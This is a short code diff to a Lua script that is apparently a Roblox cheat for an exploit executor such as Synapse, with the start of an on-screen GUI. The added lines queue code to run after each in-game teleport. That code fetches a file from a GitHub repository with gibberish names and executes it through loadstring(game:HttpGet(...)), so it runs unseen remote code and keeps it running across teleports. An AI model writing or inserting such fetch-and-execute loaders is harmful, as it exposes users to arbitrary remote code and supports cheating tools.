@@ -1,4 +1,11 @@
-wait(1)
+wait(2)
+
+local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
+
+local telscrt = [[
+    wait(4)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/uwubakadontkillme/dkdafafasfasdadamafaka/main/fdhadfiaodfgdfgdfgd.lua", true))()
+]]
 
 local ScreenGui = Instance.new("ScreenGui")
 local Gui = Instance.new("Frame")
